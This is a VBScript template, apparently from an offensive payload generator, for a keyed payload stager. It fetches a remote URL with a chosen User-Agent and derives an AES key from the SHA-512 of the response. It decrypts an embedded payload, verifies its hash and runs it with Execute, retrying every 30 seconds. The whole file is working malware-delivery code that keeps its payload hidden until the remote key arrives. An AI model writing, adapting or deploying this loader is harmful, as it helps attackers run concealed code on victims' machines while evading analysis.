dim hkPayloadHash, hkPayload
hkPayloadHash = "~HKPAYLOADHASH~"
hkPayload = "~HKPAYLOAD~"
For i = 0 To ~RETRYNUM~
    dim wc, resp, key
    set wc = CreateObject("MSXML2.XMLHTTP")
    wc.Open "GET", "~HKURL~", false
    wc.setRequestHeader "User-Agent", "~HKUSERAGENT~"
    wc.Send
    resp = wc.responseText
    key = Mid(getSHA512(resp), 1, 32)
    On Error Resume Next
    decrypted = decryptAES(hkPayload, key, "~HKIV~")
    If Err.Number = 0 Then
        If (compareHash(decrypted, hkPayloadHash, 0)) Then
            Execute decrypted
            WScript.Quit 1
        End If
    End If
    WScript.Sleep 30000
Next